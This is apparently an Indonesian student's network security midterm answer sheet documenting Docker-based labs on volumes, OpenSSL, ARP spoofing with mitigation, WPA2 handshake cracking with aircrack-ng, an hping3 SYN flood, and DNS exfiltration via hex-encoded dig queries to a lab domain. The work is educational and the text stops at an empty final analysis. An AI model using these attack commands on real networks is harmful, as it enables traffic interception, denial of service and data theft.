# JAWABAN UTS NETWORK SECURITY

**NIM**: [24552011216]    
**KASUS**: [9]

## Perhitungan Kasus
- Digit NIM: [2,4,5,5,2,0,1,1,2,1,6]
- Jumlah: [29]
- Sisa Bagi 10: [9]
- Kasus: [9]

## Tugas 1 (Pertemuan 1): Docker dan Volume
### 1. Membuat Docker Volume
Perintah ini digunakan untuk membuat penyimpanan Docker bernama `vol-k9` yang dapat digunakan oleh container.
```bash
docker volume create vol-k9
```
**Hasil Pengujian**
```text
vol-k9
```
**Analisis:**
Docker berhasil membuat volume dengan nama `vol-k9`, yang nantinya digunakan untuk menyimpan data secara persisten meskipun container dihapus.

### 2. Menjalankan Container dan Menulis Data ke Volume
Perintah ini digunakan untuk menjalankan container sementara bernama `w-k9` berbasis image `alpine`, menghubungkannya dengan volume `vol-k9`, lalu membuat file teks berisi data di dalamnya.
```bash
docker run --name w-k9 -v vol-k9:/data alpine sh -c 'echo 24552011216 > /data/laporan-k9.txt'
```
**Hasil Pengujian**
```text
none
```
**Analisis:**
Container `w-k9` berhasil dijalankan dan langsung menuliskan string `24552011216` ke dalam file `/data/laporan-k9.txt` yang terhubung dengan volume `vol-k9`. Output kosong menandakan proses penulisan berjalan sukses tanpa error sebelum container otomatis berhenti (_exit_).

### 3. Menghapus Container Penulis
Perintah ini digunakan untuk menghapus container `w-k9` setelah proses penulisan data ke dalam volume selesai.
```bash
docker rm w-k9
```
**Hasil Pengujian**
```text
w-k9
```
**Analisis:**
Container `w-k9` berhasil dihapus dari sistem, yang ditandai dengan munculnya nama container tersebut pada output. Meskipun container sudah dihapus, data yang sebelumnya ditulis tetap tersimpan dengan aman di dalam volume `vol-k9` untuk pengujian selanjutnya.

### 4. Membaca Data dari Volume dengan Container Baru
Perintah ini digunakan untuk menjalankan container sementara berbasis image `alpine` yang terhubung ke volume `vol-k9` guna membaca dan memverifikasi isi file `/data/laporan-k9.txt`.
```bash
docker run --rm -v vol-k9:/data alpine cat /data/laporan-k9.txt
```
**Hasil Pengujian**
```text
24552011216
```
**Analisis:**
Container baru berhasil membaca isi file `/data/laporan-k9.txt` dan menampilkan output `24552011216`. Hal ini membuktikan bahwa Docker Volume (`vol-k9`) berhasil menyimpan data secara persisten meskipun container sebelumnya (`w-k9`) telah dihapus. Opsi `--rm` juga memastikan container pembaca ini langsung otomatis terhapus setelah selesai menampilkan output.

### 5. Menjalankan Multi-Container dengan Docker Compose
Perintah ini digunakan untuk membangun dan menjalankan dua container secara bersamaan di latar belakang menggunakan konfigurasi file `docker-compose.yml` dengan nama proyek k9.
```bash
docker compose -p k9 -f 01-sumber-lab/b/b1-compose/docker-compose.yml up -d
```
**Hasil Pengujian**
```text
[+] Running 2/2
✓ Container k9-target-1    Started                              0.8s
✓ Container k9-attacker-1  Started                              0.8s
```
**Analisis:**
Docker Compose berhasil menjalankan kedua container sesuai konfigurasi, yaitu `k9-target-1` dan `k9-attacker-1`, yang ditandai dengan status `Started`. Opsi `-d` membuat kedua container berjalan di background sehingga terminal tetap dapat digunakan untuk perintah pengujian berikutnya, dan keduanya otomatis terhubung dalam satu jaringan (_network_) khusus proyek k9.

### 6. Menguji Komunikasi Antar-Container pada Docker Compose
Perintah ini digunakan untuk menjalankan utilitas `wget` di dalam container attacker guna mengakses layanan web HTTP pada container `target` menggunakan nama layanannya.
```bash
docker compose -p k9 -f 01-sumber-lab/b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
```
**Hasil Pengujian**
```text
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark;}
body { width: 35em; margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<h1>Welcome to  nginx!</h1>
<p>If you see this page, nginx is successfully installed and working.
Further configuration is required for the web server, reverse proxy,
API gateway, load balancer, content cache, or orther features.</p>

<p>For online documentation and support please refer to
<a href="https://nginx.org/">nginx.org</a>.<br/>
To engage with the community please visit
<a href="https://community.nginx.org/">community.nginx.org</a>.<br/>
For enterprise grade support, professional services, additional
security features and capabilities please refer to
<a href="https://f5.com/nginx">f5.com/nginx</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>
```
**Analisis:**
Container `attacker` berhasil melakukan permintaan HTTP ke `http://target` dan mendapatkan respons berupa kode HTML halaman default "Welcome to nginx!". Hal ini membuktikan bahwa kedua container berada dalam satu jaringan internal yang sama dan fitur DNS internal Docker Compose berjalan dengan baik untuk menerjemahkan nama layanan (`target`) menjadi alamat IP container tujuan.

### 7. Menghentikan dan Membersihkan Lingkungan Docker Compose
Perintah ini digunakan untuk menghentikan seluruh layanan yang berjalan pada proyek `k9` serta menghapus container, jaringan (_network_), dan volume yang dibuat oleh Docker Compose.
```bash
docker compose -p k9 -f 01-sumber-lab/b/b1-compose/docker-compose.yml down -v
```
**Hasil Pengujian**
```text
[+] Running 3/3
✓ Container k9-attacker-1  Removed                              10.3s                              
✓ Container k9-target-1    Removed                              0.3s
✓ Network k9_lab           Removed                              0.1s
```
**Analisis:**
Docker Compose berhasil membersihkan lingkungan lab dengan menghapus container `k9-attacker-1`, `k9-target-1`, serta jaringan `k9_lab`. Opsi `-v` memastikan seluruh volume terkait juga ikut dihapus sehingga sistem kembali bersih dan tidak menyisakan resource yang tidak terpakai.

## Tugas 2 (Pertemuan 2): Kriptografi
### 1. Enkripsi dan Dekripsi File Simetris Menggunakan OpenSSL AES-256-CBC
Perintah ini digunakan untuk menjalankan container `uts-openssl` guna mengenkripsi file teks menggunakan algoritma AES-256-CBC dengan PBKDF2, mendekripsinya kembali, serta memverifikasi integritas data menggunakan SHA-256.
```bash
docker run --rm -v "$PWD":/work uts-openssl sh -c 'echo isi laporan k9 > laporan-k9.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k9.txt -out laporan-k9.enc -pass pass:kunci-k9-2026 && sha256sum laporan-k9.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k9.enc -out hasil-k9.txt -pass pass:kunci-k9-2026 && sha256sum hasil-k9.txt'
```
**Hasil Pengujian**
```text
4bd9129aa11a7d2d2296b1e0ec1120dd9d8d929b789375edf87198a475162a93  laporan-k9.txt
4bd9129aa11a7d2d2296b1e0ec1120dd9d8d929b789375edf87198a475162a93  hasil-k9.txt
```
**Analisis:**
OpenSSL berhasil mengenkripsi file `laporan-k9.txt` menjadi `laporan-k9.enc` menggunakan kunci `kunci-k9-2026` beserta penambahan salt dan derivasi kunci PBKDF2 untuk memperkuat keamanan. Setelah didekripsi kembali menjadi `hasil-k9.txt`, kedua file menghasilkan nilai hash SHA-256 yang sama persis (`4bd9129a...162a93`), yang membuktikan bahwa proses enkripsi dan dekripsi berjalan sempurna tanpa ada perubahan atau kerusakan data.

### 2. Membuat dan Memeriksa Sertifikat Digital Self-Signed X.509
Perintah ini digunakan untuk membuat pasangan kunci privat RSA 2048-bit dan sertifikat digital self-signed berstandar X.509 untuk domain `k9.uts.local` dengan masa berlaku 30 hari, lalu menampilkan detail identitas dan tanggal berlakunya.
```bash
docker run --rm -v "$PWD":/work uts-openssl sh -c 'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k9.pem -out cert-k9.pem -days 30 -subj /CN=k9.uts.local && openssl x509 -in cert-k9.pem -noout -subject -issuer -dates'
```
**Hasil Pengujian**
```text
subject=CN=k9.uts.local
issuer=CN=k9.uts.local
notBefore=Nov 23 05:57:28 2026 GMT
notAfter=Dec 23 05:57:28 2026 GMT
```
**Analisis:**
OpenSSL berhasil menghasilkan kunci privat `key-k9.pem` dan sertifikat publik `cert-k9.pem`. Pada hasil pemeriksaan sertifikat, terlihat bahwa nilai subject dan issuer sama-sama `CN=k9.uts.local`, yang membuktikan bahwa sertifikat ini ditandatangani sendiri (_self-signed_). Selain itu, masa berlaku sertifikat tercatat mulai 23 November 2026 hingga 23 Desember 2026, sesuai dengan parameter -`days 30` yang dikonfigurasi.

## Tugas 3 (Pertemuan 3): ARP spoofing
### 1. Membuat Jaringan Bridge Khusus untuk Simulasi ARP Spoofing
Perintah ini digunakan untuk membuat jaringan virtual terisolasi di Docker bernama `lab-arp-k9` yang akan menghubungkan container korban dan penyerang dalam satu segmen jaringan lokal.
```bash
docker network create lab-arp-k9
```
**Hasil Pengujian**
```text
b078abfabe9a6662b018fd4d08e398a5da7fe463ae86d2ce00cabd87eefc0794
```
**Analisis:**
Docker berhasil membuat jaringan baru bernama `lab-arp-k9` yang ditandai dengan munculnya ID unik jaringan (`b078abfa...eefc0794`).

### 2. Menjalankan Container Korban pada Jaringan Simulasi ARP
Perintah ini digunakan untuk menjalankan container korban bernama `korban-k9` di dalam jaringan `lab-arp-k9` dengan hak akses jaringan tambahan (`NET_ADMIN`).
```bash
docker run -d --name korban-k9 --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
```
**Hasil Pengujian**
```text
fcf8af2ee5b829acffcb1ba0b4fbba515fb42ecd75ea1292cd134c41b5752686
```
**Analisis:**
Container `korban-k9` berhasil dijalankan di latar belakang dengan ID `fcf8af2e...5752686` dan sudah terhubung ke jaringan `lab-arp-k9`. Penambahan kapabilitas `NET_ADMIN` memberikan izin bagi container untuk melihat serta memanipulasi konfigurasi jaringan seperti tabel ARP selama pengujian berlangsung.

### 3. Menjalankan Container Gateway pada Jaringan Simulasi ARP
Perintah ini digunakan untuk menjalankan container bernama `gateway-k9` sebagai target komunikasi jaringan di dalam `lab-arp-k9` dengan hak akses `NET_ADMIN`.
```bash
docker run -d --name gateway-k9 --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
```
**Hasil Pengujian**
```text
e9817923d7a934d6a099757570921d88cf5d49136080e9a70ce34cc848cd2c39
```
**Analisis:**
Container `gateway-k9` berhasil dijalankan di latar belakang dengan ID `e9817923...48cd2c39` dan terhubung ke jaringan `lab-arp-k9`. Container ini akan berperan sebagai tujuan komunikasi dari `korban-k9` yang identitas MAC address-nya akan dipalsukan dalam skenario ARP spoofing.

### 4. Menjalankan Container Penyerang pada Jaringan Simulasi ARP
Perintah ini digunakan untuk menjalankan container penyerang bernama `penyerang-k9` di dalam jaringan `lab-arp-k9` dengan hak akses `NET_ADMIN`.
```bash
docker run -d --name penyerang-k9 --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
```
**Hasil Pengujian**
```text
df128e4b5894440b433b79e9d898d07d170671a430cec093d52da4af92b119f0
```
**Analisis:**
Container `penyerang-k9` berhasil dijalankan di latar belakang dengan ID `df128e4b...92b119f0` dan berada dalam satu jaringan lokal dengan `korban-k9` serta `gateway-k9`. Kapabilitas `NET_ADMIN` memungkinkan container ini mengirim paket ARP palsu (_ARP spoofing_) untuk meracuni tabel ARP korban.

### 5. Memeriksa Alamat IP Container Korban dan Gateway
Perintah ini digunakan untuk mengambil informasi alamat IP internal dari container `korban-k9` dan `gateway-k9` yang terhubung pada jaringan `lab-arp-k9`.
```bash
docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k9").IPAddress}}' korban-k9 gateway-k9
```
**Hasil Pengujian**
```text
172.18.0.2
172.18.0.3
```
**Analisis:**
Docker berhasil menampilkan alamat IP kedua container secara berurutan, yaitu `172.18.0.2` untuk `korban-k9` dan `172.18.0.3` untuk `gateway-k9`. Kedua IP ini berada dalam satu subnet yang sama sehingga siap digunakan sebagai target pada pengujian ARP spoofing.

### 6. Memeriksa Tabel ARP Awal pada Container Korban
Perintah ini digunakan untuk melihat daftar pemetaan alamat IP ke alamat MAC (ARP cache) yang tersimpan di dalam container `korban-k9` sebelum serangan dilakukan.
```bash
docker exec korban-k9 arp -a
```
**Hasil Pengujian**
```text
gateway-k9.lab-arp-k9 (172.18.0.3) at be:5b:37:87:4c:98 [ether] on eth0
gara (172.18.0.1) at e6:14:eb:a3:2e:70 [ether] on eth0
```
**Analisis:**
Tabel ARP `korban-k9` menunjukkan bahwa IP `gateway-k9` (`172.18.0.3`) masih terpetakan ke MAC address aslinya yaitu `be:5b:37:87:4c:98`. Data ini menjadi acuan normal untuk membandingkan perubahan MAC address setelah serangan ARP spoofing dijalankan.

### 7. Menjalankan Serangan ARP Spoofing dari Container Penyerang
Perintah ini digunakan untuk menjalankan utilitas arpspoof di latar belakang pada container `penyerang-k9` selama 20 detik guna memalsukan identitas MAC `gateway-k9` (`172.18.0.3`) kepada `korban-k9` (`172.18.0.2`).
```bash
docker exec -d penyerang-k9 timeout 20 arpspoof -i eth0 -t 172.18.0.2 172.18.0.3
```
**Hasil Pengujian**
```text
none
```
**Analisis:**
Perintah `arpspoof` berhasil dieksekusi di latar belakang tanpa error untuk mengirimkan paket balasan ARP palsu secara terus-menerus ke `korban-k9`. output kosong/none menandakan perintah `arpspoof` berhasil dijalankan di latar belakang dengan opsi `-d` selama 20 detik

### 8. Memverifikasi Keberhasilan ARP Spoofing pada Tabel ARP Korban
Perintah ini digunakan untuk memeriksa kembali tabel ARP (`arp -a`) pada container `korban-k9` saat serangan berlangsung guna membuktikan terjadinya manipulasi alamat MAC.
```bash
docker exec korban-k9 arp -a
```
**Hasil Pengujian**
```text
gateway-k9.lab-arp-k9 (172.18.0.3) at 42:13:31:0d:e7:ef [ether] on eth0
gara (172.18.0.1) at e6:14:eb:a3:2e:70 [ether] on eth0
penyerang-k9.lab-arp-k9 (172.18.0.4) at 42:13:31:0d:e7:ef [ether] on eth0
```
**Analisis:**
Serangan ARP spoofing terbukti berhasil karena MAC address `gateway-k9` (`172.18.0.3`) di tabel ARP korban telah berubah dari `be:5b:37:87:4c:98` menjadi `42:13:31:0d:e7:ef`, yang merupakan MAC address milik `penyerang-k9` (`172.18.0.4`). Kondisi ini membuat setiap paket data dari korban yang ditujukan ke gateway akan dibelokkan menuju container penyerang (_Man-in-the-Middle_).

### 9. Menerapkan Mitigasi ARP Spoofing dengan Entri ARP Statis
Perintah ini digunakan untuk mengunci pemetaan alamat IP `gateway-k9` (`172.18.0.3`) ke alamat MAC aslinya secara permanen (_static ARP entry_) di dalam container `korban-k9`.
```bash
docker exec korban-k9 arp -s 172.18.0.3 $(docker exec gateway-k9 cat /sys/class/net/eth0/address)
```
**Hasil Pengujian**
```text
none
```
**Analisis:**
Container `korban-k9` berhasil menyimpan entri ARP statis untuk IP `172.18.0.3` menggunakan MAC address asli yang diambil langsung dari sistem `gateway-k9`. Dengan adanya entri statis (`PERM`), tabel ARP korban tidak lagi menerima pembaruan ARP dinamis secara sembarangan sehingga kebal terhadap manipulasi ARP spoofing. output kosong/none menandakan perintah `arp -s` berhasil menambahkan entri ARP statis tanpa error.

### 10. Memverifikasi Entri ARP Statis pada Container Korban
Perintah ini digunakan untuk memeriksa kembali tabel ARP pada container `korban-k9` guna memastikan konfigurasi ARP statis telah aktif dan mengembalikan alamat MAC `gateway-k9` ke nilai aslinya.
```bash
docker exec korban-k9 arp -a
```
**Hasil Pengujian**
```text
penyerang-k9.lab-arp-k9 (172.18.0.4) at 42:13:31:0d:e7:ef [ether] on eth0
gara (172.18.0.1) at e6:14:eb:a3:2e:70 [ether] on eth0
gateway-k9.lab-arp-k9 (172.18.0.3) at be:5b:37:87:4c:98 [ether] PERM on eth0
```
**Analisis:**
Tabel ARP `korban-k9` menunjukkan bahwa IP `gateway-k9` (`172.18.0.3`) telah kembali terpetakan ke MAC address aslinya (`be:5b:37:87:4c:98`) dengan status `PERM` (_permanent_). Penanda `PERM` membuktikan bahwa entri tersebut terkunci secara statis dan tidak dapat ditimpa lagi oleh paket ARP spoofing dari penyerang.

## Tugas 4 (Pertemuan 4): Analisis handshake WPA2
### Analisis dan Pengujian Wordlist terhadap WPA2 Handshake dengan Aircrack-ng
Perintah ini digunakan untuk menjalankan utilitas `aircrack-ng` di dalam container `uts-kali-tools` guna menganalisis tangkapan paket WPA2 (`handshake-k9.cap`) dan menguji seluruh kombinasi kata sandi yang terdapat pada file `wordlist-k9.txt`.
```bash
docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w wordlist-k9.txt handshake-k9.cap
```
**Hasil Pengujian**
```text
Reading packets, please wait...
Resetting EAPOL Handshake decoder state.
Opening handshake-k9.cap
Read 499 packets.

   #  BSSID              ESSID                     Encryption

   1  00:0B:86:C2:A4:85  linksys                   WPA (1 handshake, with PMKID)

Choosing first network as target.

Reading packets, please wait...
Resetting EAPOL Handshake decoder state.
Opening handshake-k9.cap
Read 499 packets.

1 potential targets

                               Aircrack-ng 1.7 

      [00:00:00] 20/20 keys tested (901.87 k/s) 

      Time left: --

                                KEY NOT FOUND


      Master Key     : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```
**Analisis:**
`Aircrack-ng` berhasil mendeteksi 1 paket handshake WPA2 pada jaringan target linksys (`00:0B:86:C2:A4:85`) dan menguji 20 kunci dari `wordlist-k9.txt`, namun menghasilkan status `KEY NOT FOUND` karena kata sandi asli tidak tercantum di dalam daftar kamus (_wordlist_) tersebut.

**Penjelasan Empat Langkah WPA2 Handshake (4-Way Handshake):**
```text
1. Message 1 (AP → Client): Access Point (AP) mengirimkan nilai acak bernama ANonce (Authenticator Nonce) kepada klien untuk memulai proses pembentukan kunci enkripsi sesi.
2. Message 2 (Client → AP): Klien menghasilkan nilai acaknya sendiri (SNonce), menggabungkannya dengan ANonce, alamat MAC AP, alamat MAC klien, dan PMK (Pairwise Master Key) untuk membentuk PTK (Pairwise Transient Key), lalu mengirimkan SNonce beserta kode integritas MIC (Message Integrity Code) ke AP.
3. Message 3 (AP → Client): AP memverifikasi MIC dari klien, menghitung PTK yang sama, lalu mengirimkan GTK (Group Temporal Key untuk enkripsi lalu lintas broadcast/multicast) beserta MIC kepada klien.
4. Message 4 (Client → AP): Klien mengirimkan pesan konfirmasi (ACK) kepada AP bahwa seluruh kunci telah terpasang dan komunikasi terenkripsi siap digunakan.
```

## Tugas 5 (Pertemuan 5): ICMP dengan Scapy
### Mengirim dan Menganalisis Paket ICMP Menggunakan Scapy
Perintah ini digunakan untuk menjalankan skrip Python berbasis pustaka Scapy (`kirim_icmp.py`) di dalam jaringan `lab-arp-k9` guna menyusun serta mengirimkan paket ICMP Echo Request ke alamat IP `172.18.0.2` dan membaca respons balasannya.
```bash
docker run --rm --network lab-arp-k9 -v "$PWD/01-sumber-lab/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py 172.18.0.2
```
**Hasil Pengujian**
```text
Mengirim: IP / ICMP 172.18.0.5 > 172.18.0.2 echo-request 0
TTL balasan: 64
Tipe ICMP balasan: 0
```
**Analisis:**
Scapy berhasil mengirimkan paket ICMP Echo Request dari `172.18.0.5` menuju `172.18.0.2` dan menerima balasan valid dengan tipe `ICMP 0` (Echo Reply) serta nilai _Time To Live_ (`TTL`) 64 (karakteristik standar sistem operasi Linux). Hasil ini menunjukkan bahwa host tujuan aktif, dapat dijangkau dalam satu segmen jaringan, dan merespons paket kustom yang dibuat secara programatik.

**Penjelasan Smurf Attack**
```text
Smurf Attack adalah jenis serangan Distributed Denial of Service (DDoS) pada lapisan jaringan (Network Layer) yang memanfaatkan protokol ICMP dan alamat IP broadcast.
```

## Tugas 6 (Pertemuan 6): SYN flood dan three-way handshake
### 1. Menjalankan Lingkungan Simulasi SYN Flood dengan Docker Compose
Perintah ini digunakan untuk membangun jaringan virtual `k9_lab` dan menjalankan container `k9-attacker-1` serta `k9-target-1` di latar belakang menggunakan file konfigurasi `docker-compose.yml` untuk simulasi serangan SYN Flood.
```bash
docker compose -p k9 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml up -d
```
**Hasil Pengujian**
```text
[+] Running 3/3
✓ Network k9_lab           Started                              0.7s
✓ Container k9-attacker-1  Started                              0.7s
✓ Container k9-target-1    Started                              0.7s
```
**Analisis:**
Docker Compose berhasil menyiapkan lingkungan lab terisolasi dengan mengaktifkan jaringan `k9_lab` serta menjalankan container penyerang (`k9-attacker-1`) dan target (`k9-target-1`). 

### 2. Memeriksa Jumlah Koneksi SYN_RECV Awal pada Container Target
Perintah ini digunakan untuk menghitung jumlah soket jaringan berstatus `SYN_RECV` di dalam container `target` menggunakan `netstat` sebagai acuan kondisi normal sebelum serangan SYN Flood dijalankan.
```bash
docker compose -p k9 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
```
**Hasil Pengujian**
```text
0
```
**Analisis:**
Container `target` menunjukkan `0` koneksi berstatus `SYN_RECV`, yang membuktikan bahwa antrean koneksi `TCP half-open` dalam keadaan bersih dan belum menerima banjir paket SYN palsu dari penyerang.

### 3. Melancarkan Serangan SYN Flood Menggunakan hping3
Perintah ini digunakan untuk menjalankan `hping3` di latar belakang pada container attacker selama 15 detik guna membanjiri port 80 container `target` dengan paket TCP SYN (`-S`) menggunakan alamat IP sumber acak (`--rand-source`).
```bash
docker compose -p k9 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood --rand-source target
```
**Hasil Pengujian**
```text
none
```
**Analisis:**
output kosong/none menandakan perintah `hping3` berhasil dijalankan di latar belakang dengan opsi `-d` selama 15 detik. Teknik ini memaksa server `target` mengalokasikan memori untuk membalas setiap permintaan dengan paket `SYN-ACK` yang tidak pernah dikonfirmasi kembali oleh pengirim palsu, sehingga menumpuk koneksi setengah terbuka (_half-open_).

### 4. Memverifikasi Peningkatan Koneksi SYN_RECV pada Container Target
Perintah ini digunakan untuk menghitung kembali jumlah koneksi jaringan berstatus `SYN_RECV` pada container `target` saat serangan berlangsung guna membuktikan dampak dari banjir paket SYN.
```bash
docker compose -p k9 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
```
**Hasil Pengujian**
```text
8
```
**Analisis:**
Jumlah koneksi berstatus `SYN_RECV` pada target meningkat dari `0` menjadi `8`, yang membuktikan bahwa server sedang menahan sejumlah koneksi `half-open` sambil menunggu paket ACK terakhir dari alamat IP pengirim acak yang tidak pernah datang. Jika antrean backlog SYN ini penuh, server akan kesulitan atau gagal melayani permintaan koneksi baru dari pengguna yang sah.

### 5. Menangkap dan Menganalisis Proses TCP Three-Way Handshake dengan tcpdump
Perintah ini digunakan untuk menangkap lalu lintas TCP port 80 menggunakan `tcpdump` pada container `attacker` sambil melakukan permintaan HTTP normal ke `target` menggunakan `curl` guna mengamati siklus koneksi TCP secara utuh.
```bash
docker compose -p k9 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
```
**Hasil Pengujian**
```text
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
07:17:18.144359 IP 172.19.0.2.42498 > 172.19.0.3.80: Flags [S], seq 4107155652, win 64240, options [mss 1460,sackOK,TS val 2883927288 ecr 0,nop,wscale 10], length 0
07:17:18.144388 IP 172.19.0.3.80 > 172.19.0.2.42498: Flags [S.], seq 3677737955, ack 4107155653, win 65160, options [mss 1460,sackOK,TS val 4270507158 ecr 2883927288,nop,wscale 10], length 0
07:17:18.144401 IP 172.19.0.2.42498 > 172.19.0.3.80: Flags [.], ack 1, win 63, options [nop,nop,TS val 2883927288 ecr 4270507158], length 0
07:17:18.144465 IP 172.19.0.2.42498 > 172.19.0.3.80: Flags [P.], seq 1:71, ack 1, win 63, options [nop,nop,TS val 2883927288 ecr 4270507158], length 70: HTTP: GET / HTTP/1.1
07:17:18.144479 IP 172.19.0.3.80 > 172.19.0.2.42498: Flags [.], ack 71, win 64, options [nop,nop,TS val 4270507158 ecr 2883927288], length 0
07:17:18.144634 IP 172.19.0.3.80 > 172.19.0.2.42498: Flags [P.], seq 1:239, ack 71, win 64, options [nop,nop,TS val 4270507158 ecr 2883927288], length 238: HTTP: HTTP/1.1 200 OK
07:17:18.144645 IP 172.19.0.2.42498 > 172.19.0.3.80: Flags [.], ack 239, win 63, options [nop,nop,TS val 2883927288 ecr 4270507158], length 0
07:17:18.144670 IP 172.19.0.3.80 > 172.19.0.2.42498: Flags [P.], seq 239:1135, ack 71, win 64, options [nop,nop,TS val 4270507158 ecr 2883927288], length 896: HTTP
07:17:18.144675 IP 172.19.0.2.42498 > 172.19.0.3.80: Flags [.], ack 1135, win 63, options [nop,nop,TS val 2883927288 ecr 4270507158], length 0
07:17:18.145453 IP 172.19.0.2.42498 > 172.19.0.3.80: Flags [F.], seq 71, ack 1135, win 63, options [nop,nop,TS val 2883927289 ecr 4270507158], length 0
07:17:18.145488 IP 172.19.0.3.80 > 172.19.0.2.42498: Flags [F.], seq 1135, ack 72, win 64, options [nop,nop,TS val 4270507159 ecr 2883927289], length 0
07:17:18.145496 IP 172.19.0.2.42498 > 172.19.0.3.80: Flags [.], ack 1136, win 63, options [nop,nop,TS val 2883927289 ecr 4270507159], length 0

12 packets captured
12 packets received by filter
0 packets dropped by kernel
```
**Analisis:**
Hasil tangkapan `tcpdump` memperlihatkan siklus lengkap koneksi TCP normal antara klien (`172.19.0.2`) dan server (`172.19.0.3`): dimulai dengan proses Three-Way Handshake pada tiga paket pertama (`Flags [S]` / SYN, `Flags [S.]` / SYN-ACK, dan `Flags [.]` / ACK), dilanjutkan pertukaran data HTTP (`GET / HTTP/1.1` yang dibalas `HTTP/1.1 200 OK`), serta diakhiri penutupan sesi secara normal melalui pertukaran paket FIN (`Flags [F.]`).

### 6. Menghentikan dan Membersihkan Lingkungan Simulasi SYN Flood
Perintah ini digunakan untuk menghentikan layanan yang berjalan pada proyek `k9` serta menghapus seluruh container, jaringan (`k9_lab`), dan volume terkait setelah pengujian selesai.
```bash
docker compose -p k9 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml down -v
```
**Hasil Pengujian**
```text
[+] Running 3/3
✓ Container k9-attacker-1  Removed                              10.3s
✓ Container k9-target-1    Removed                              0.3s
✓ Network k9_lab           Removed                              0.1s
```
**Analisis:**
Docker Compose berhasil membersihkan seluruh lingkungan lab dengan menghapus container `k9-attacker-1`, `k9-target-1`, serta jaringan `k9_lab`. Opsi `-v` memastikan seluruh volume terkait juga ikut dihapus sehingga sistem kembali bersih dan bebas dari sisa proses simulasi serangan.

## Tugas 7 (Pertemuan 7): DNS exfiltration
### 1. Menjalankan Lingkungan Simulasi DNS Exfiltration dengan Docker Compose
Perintah ini digunakan untuk membangun jaringan virtual dan menjalankan container `k9-attacker-1` serta `k9-dns-1` di latar belakang menggunakan file konfigurasi docker-compose.yml untuk simulasi DNS Exfiltration.
```bash
docker compose -p k9 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml up -d
```
**Hasil Pengujian**
```text
[+] Running 3/3
✓ Network k9-attacker-1    Started                              0.7s
✓ Container k9-attacker-1  Started                              0.7s
✓ Container k9-dns-1       Started                              0.7s
```
**Analisis:**
Docker Compose berhasil menyiapkan lingkungan lab dengan mengaktifkan jaringan internal serta menjalankan container `k9-attacker-1` dan `k9-dns-1` di latar belakang sehingga siap digunakan untuk pengujian pengiriman data tersembunyi melalui kueri DNS.

### 2. Mengonversi Data Rahasia ke Format Heksadesimal (Encoding)
Perintah ini digunakan untuk mengubah string `NIM-24552011216-K9` menjadi representasi heksadesimal menggunakan utilitas `xxd -p` agar aman disisipkan sebagai label subdomain pada kueri DNS.
```bash
echo -n NIM-24552011216-K9 | xxd -p
```
**Hasil Pengujian**
```text
4e494d2d32343535323031313231362d4b39
```
**Analisis:**
Utilitas `xxd -p` berhasil mengonversi teks `NIM-24552011216-K9` menjadi deretan karakter heksadesimal `4e494d2d32343535323031313231362d4b39`. Opsi `echo -n` memastikan tidak ada karakter baris baru (`0a`) yang ikut ter-encode, sehingga string heksadesimal ini siap diselundupkan sebagai payload subdomain dalam simulasi DNS Exfiltration.

### 3. Mengirimkan Payload Data melalui Kueri Subdomain DNS (DNS Exfiltration)
Perintah ini digunakan untuk mengeksekusi utilitas `dig` di dalam container `attacker` guna mengirimkan kueri DNS ke server `@dns` dengan menyisipkan string data heksadesimal sebagai subdomain dari `k9.exfil.lab`.
```bash
docker compose -p k9 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml exec attacker dig +short 4e494d2d32343535323031313231362d4b39.k9.exfil.lab @dns
```
**Hasil Pengujian**
```text
10.0.0.99
```
**Analisis:**
Container `attacker` berhasil mengirimkan kueri DNS berisi payload heksadesimal (`4e494d2d32343535323031313231362d4b39.k9.exfil.lab`) ke server DNS tujuan dan mendapatkan balasan IP `10.0.0.99`. Hal ini membuktikan bahwa mekanisme DNS Exfiltration berjalan sukses karena data rahasia yang disamarkan sebagai nama domain berhasil dikirim melewati jalur kueri DNS dan diterima oleh server DNS target.

### 4. Menyimpan Log Aktivitas Server DNS ke File Eksternal
Perintah ini digunakan untuk mengekstrak seluruh catatan aktivitas (`logs`) dari container dns dan menyimpannya ke dalam file `dns-k9.log` pada direktori host guna analisis forensik maupun pembuktian penerimaan data.
```bash
docker compose -p k9 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml logs dns > dns-k9.log
```
**Hasil Pengujian**
```text
none
```
**Analisis:**
